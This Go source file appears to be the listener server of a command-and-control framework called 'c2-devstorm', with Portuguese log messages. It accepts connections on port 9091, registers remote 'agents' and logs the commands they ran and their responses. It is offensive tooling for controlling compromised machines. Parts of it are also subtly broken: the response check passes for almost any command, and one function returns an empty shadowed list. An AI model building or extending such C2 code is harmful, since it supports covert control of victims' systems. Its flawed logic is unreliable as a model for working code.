package main

// Imports
import (
	"c2-devstorm/commons"
	"encoding/gob"
	"log"
	"net"
)

// Global variables
var (
	agentList = []commons.Message{}
)

// Main function
func main() {
	log.Println("Entrei em execução.")
	startListener("9091")
}

//func init() {
//	agentList = make([]commons.Message, 0)
//}

// Function to check if agent is already registered
func agentCreated(agentID string) (registered bool) {
	registered = false
	for _, agent := range agentList {
		if agent.AgentID == agentID {
			return true
		}
	}
	return false
}

// Function to check if message contains response
func messageContainsResponse(message *commons.Message) (contains bool) {
	contains = false
	for _, command := range message.Commands {
		if command.Response != "" || command.Response != " " || len(command.Response) > 0 {
			return true
		}
	}
	return false
}

// Function to list agents
func agentLists(agentID string) (agentList []commons.Message) {
	for _, agent := range agentList {
		log.Println(agent)
	}
	return agentList
}

// Function to open socket
func startListener(port string) {
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatal("Erro ao iniciar o Listener", err.Error())
	} else {
		for {
			channel, err := listener.Accept()
			defer channel.Close()

			if err != nil {
				log.Println("Erro em um novo canal:", err.Error())
			} else {
				message := &commons.Message{}
				gob.NewDecoder(channel).Decode(message)
				if agentCreated(message.AgentID) {
					log.Println("Agent Message: ", message.AgentID+"\n")

					// TODO: Check if message contains response
					if messageContainsResponse(message) {
						log.Println("Mensagem contém resposta: ", message.AgentID+"\n")
						for _, command := range message.Commands {
							log.Println("Comando: ", command.Command+"\n")
							log.Println("Resposta: ", command.Response+"\n")
							//for _, agent := range agentList {
							//	if agent.AgentID == message.AgentID {
							//		agent.Commands = append(agent.Commands, command)
							//	}
							//
							//}
						}

					}
				} else {

					log.Println("Nova Conexão: \n", channel.RemoteAddr().String())
					agentList = append(agentList, *message)
				}

				gob.NewEncoder(channel).Encode(message)

			}
		}
	}
}
